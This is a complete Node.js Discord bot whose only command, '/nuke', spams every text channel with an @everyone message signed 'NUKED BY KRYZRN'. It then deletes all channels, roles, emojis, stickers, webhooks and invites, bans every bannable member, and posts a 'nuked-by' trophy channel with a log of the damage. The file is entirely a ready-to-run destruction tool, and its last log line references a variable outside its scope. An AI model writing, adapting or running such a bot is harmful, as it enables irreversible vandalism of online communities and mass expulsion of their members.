require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, PermissionFlagsBits, ChannelType } = require('discord.js');

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

if (!TOKEN) {
    console.error('FATAL: DISCORD_TOKEN missing.');
    process.exit(1);
}

// ---------- SPAM CONFIG ----------
const SPAM_MESSAGE = `> __NUKED BY KRYZRN__\n||@everyone @here||`;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ---------- Slash command registration ----------
const commands = [
    {
        name: 'nuke',
        description: '⚠️ SPAM + DELETE EVERYTHING (channels, roles, bans all members)',
        default_member_permissions: '0'
    }
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
    try {
        console.log('Registering slash commands...');
        if (GUILD_ID) {
            await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
            console.log(`Registered guild commands for ${GUILD_ID}`);
        } else {
            await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
            console.log('Registered global commands (may take up to 1 hour)');
        }
    } catch (error) {
        console.error('Command registration error:', error);
    }
})();

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ---------- SPAM FUNCTION (fast, concurrent) ----------
async function spamAllChannels(guild) {
    const textChannels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText && ch.isTextBased() && ch.viewable);
    if (textChannels.size === 0) return;

    console.log(`🔥 Spamming ${textChannels.size} channels with: ${SPAM_MESSAGE}`);

    // Send to all channels concurrently (as fast as Discord allows)
    const promises = textChannels.map(async (channel) => {
        try {
            await channel.send(SPAM_MESSAGE);
            return `✅ Sent to #${channel.name}`;
        } catch (err) {
            return `❌ Failed #${channel.name}: ${err.message}`;
        }
    });

    const results = await Promise.allSettled(promises);
    const successCount = results.filter(r => r.status === 'fulfilled' && r.value.startsWith('✅')).length;
    console.log(`Spam completed: ${successCount}/${textChannels.size} channels`);
}

// ---------- NUKE FUNCTION (with pre‑spam) ----------
async function nukeServer(guild, executor) {
    const logs = [];
    const startTime = Date.now();

    // 0. SPAM EVERY TEXT CHANNEL FIRST
    logs.push('📢 Starting SPAM phase...');
    await spamAllChannels(guild);
    logs.push('✅ Spam phase completed.');

    // 1. Create temporary log channel (may be deleted later)
    let logChannel = null;
    try {
        logChannel = await guild.channels.create({
            name: 'nuke-progress',
            type: ChannelType.GuildText,
            reason: 'Nuke operation in progress'
        });
        logs.push('✅ Created progress log channel');
    } catch (err) {
        logs.push(`❌ Could not create log channel: ${err.message}`);
    }

    const log = (msg) => {
        console.log(msg);
        logs.push(msg);
        if (logChannel) logChannel.send(msg).catch(() => {});
    };

    log(`🔥 NUKE INITIATED by ${executor.tag} (${executor.id})`);

    // 2. Delete all channels
    log('📢 Deleting all channels...');
    const channelDeletePromises = guild.channels.cache.map(async (channel) => {
        try {
            if (channel.deletable) await channel.delete(`Nuked by ${executor.tag}`);
            else log(`⚠️ Cannot delete ${channel.name} - not deletable`);
        } catch (err) {
            log(`❌ Failed delete ${channel.name}: ${err.message}`);
        }
        await delay(300);
    });
    await Promise.allSettled(channelDeletePromises);
    log('✅ All possible channels deleted.');

    // 3. Delete all roles (except @everyone)
    log('🎭 Deleting all roles...');
    const rolesToDelete = guild.roles.cache.filter(r => r.id !== guild.roles.everyone.id && !r.managed);
    for (const role of rolesToDelete.values()) {
        try {
            if (role.editable) await role.delete(`Nuked by ${executor.tag}`);
            else log(`⚠️ Cannot delete role ${role.name}`);
        } catch (err) {
            log(`❌ Failed delete role ${role.name}: ${err.message}`);
        }
        await delay(300);
    }
    log('✅ Roles deleted.');

    // 4. Delete emojis
    log('😀 Deleting emojis...');
    for (const emoji of guild.emojis.cache.values()) {
        try {
            if (emoji.deletable) await emoji.delete();
        } catch (err) {
            log(`❌ Failed delete emoji ${emoji.name}: ${err.message}`);
        }
        await delay(300);
    }
    log('✅ Emojis deleted.');

    // 5. Delete stickers
    log('📎 Deleting stickers...');
    for (const sticker of guild.stickers.cache.values()) {
        try {
            if (sticker.deletable) await sticker.delete();
        } catch (err) {
            log(`❌ Failed delete sticker ${sticker.name}: ${err.message}`);
        }
        await delay(300);
    }
    log('✅ Stickers deleted.');

    // 6. Delete webhooks
    log('🪝 Deleting webhooks...');
    const webhooks = await guild.fetchWebhooks();
    for (const webhook of webhooks.values()) {
        try {
            await webhook.delete();
        } catch (err) {
            log(`❌ Failed delete webhook ${webhook.name}: ${err.message}`);
        }
        await delay(300);
    }
    log('✅ Webhooks deleted.');

    // 7. Delete invites
    log('📨 Deleting invites...');
    const invites = await guild.invites.fetch();
    for (const invite of invites.values()) {
        try {
            await invite.delete();
        } catch (err) {
            log(`❌ Failed delete invite ${invite.code}: ${err.message}`);
        }
        await delay(300);
    }
    log('✅ Invites deleted.');

    // 8. Ban all members
    log('🔨 Banning all members...');
    const members = await guild.members.fetch({ force: true });
    let bannedCount = 0;
    for (const member of members.values()) {
        if (member.id === client.user.id) continue;
        if (!member.bannable) {
            log(`⚠️ Cannot ban ${member.user.tag} - hierarchy/perms`);
            continue;
        }
        try {
            await member.ban({ reason: `Nuked by ${executor.tag}` });
            bannedCount++;
        } catch (err) {
            log(`❌ Failed ban ${member.user.tag}: ${err.message}`);
        }
        await delay(500);
    }
    log(`✅ Banned ${bannedCount} members.`);

    // 9. Create final evidence channel
    log('📝 Creating final evidence channel...');
    let finalChannel = null;
    try {
        finalChannel = await guild.channels.create({
            name: 'nuked-by-' + executor.username,
            type: ChannelType.GuildText,
            reason: 'Nuke completion'
        });
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
        await finalChannel.send({
            content: `**💀 SERVER NUKED 💀**\nExecuted by: ${executor.tag}\nTime taken: ${elapsed}s\n\nSpam message used:\n${SPAM_MESSAGE}\n\n\`\`\`${logs.join('\n').slice(0, 1900)}\`\`\``
        });
    } catch (err) {
        console.error('Could not create final channel:', err);
    }

    log(`🔥 Nuke completed in ${elapsed}s`);
    return { finalChannel, logs };
}

// ---------- Command handler ----------
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName === 'nuke') {
        if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator) && interaction.user.id !== interaction.guild.ownerId) {
            return interaction.reply({ content: '❌ You need Administrator permission.', ephemeral: true });
        }

        await interaction.reply({ content: '⚠️ **NUKE + SPAM initiated!** Spamming all text channels now, then deleting everything and banning all members. This is irreversible.', ephemeral: true });

        try {
            await nukeServer(interaction.guild, interaction.user);
        } catch (err) {
            console.error('Nuke error:', err);
            try {
                await interaction.followUp({ content: `❌ Nuke failed: ${err.message}`, ephemeral: true });
            } catch (e) {}
        }
    }
});

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Serving ${client.guilds.cache.size} guilds`);
});

process.on('unhandledRejection', console.error);
client.login(TOKEN); 
